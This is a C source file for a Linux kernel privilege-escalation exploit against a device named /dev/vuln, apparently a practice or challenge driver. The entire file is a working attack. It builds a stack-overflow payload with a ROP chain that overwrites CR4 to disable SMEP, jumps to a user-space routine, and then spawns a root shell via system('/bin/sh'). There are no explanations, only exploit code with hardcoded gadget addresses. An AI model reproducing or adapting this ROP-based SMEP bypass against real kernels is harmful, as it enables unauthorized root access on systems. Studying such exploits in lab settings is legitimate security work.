#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

extern void asm_exploit(void);
extern void get_regs(void);

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_flags;
#define USTACKSZ 1024
unsigned char __attribute__((aligned(16))) user_stack[USTACKSZ];
unsigned char *user_stack_end = user_stack + USTACKSZ - sizeof(unsigned long);

#define OFFSET (5*8+16)
#define PAYLOAD_LINES 6

#define PAYLOADSZ (OFFSET + PAYLOAD_LINES * sizeof(unsigned long))
char payload[PAYLOADSZ];

// 0xffffffff8100293a pop rdi; ret;
// cr4 00000000005406f0 need to be 00000000004406f0
// 0xffffffff8103da6e: mov cr4, rdi; push rdx; popfq; ret; 

// rflags needs to be 

int main()
{
	int fd;
	int i;
	char *p;
	unsigned long pop_rdi = 0xffffffff8100293a;
	unsigned long cr4_value = 0x00000000004406f0;
	unsigned long zero = 0x0;
	unsigned long mov_cr4 = 0xffffffff8103da6e;
	unsigned long pop_rdx = 0xffffffff81045eec;

	get_regs();

	for (p = payload; p < payload + OFFSET; p++) {
		*p = 'A';
	}
	*(unsigned long*)p = pop_rdi;	
	*(unsigned long*)(p + 8) = cr4_value;
	*(unsigned long*)(p + 16) = pop_rdx;
	*(unsigned long*)(p + 24) = zero;
	*(unsigned long*)(p + 32) = mov_cr4;
	*(unsigned long*)(p + 40) = (unsigned long)&asm_exploit;

	fd = open("/dev/vuln", O_WRONLY);
	if (fd < 0) {
		perror("/dev/vuln");
		exit(1);
	}

	i = 0;
	while (i < PAYLOADSZ) {
		int n = write(fd, payload + i, PAYLOADSZ - i);
		if (n < 0) {
			perror("write");
			exit(1);
		}
		i += n;
	}
}

void cont()
{
	system("/bin/sh");
	_exit(0);
}
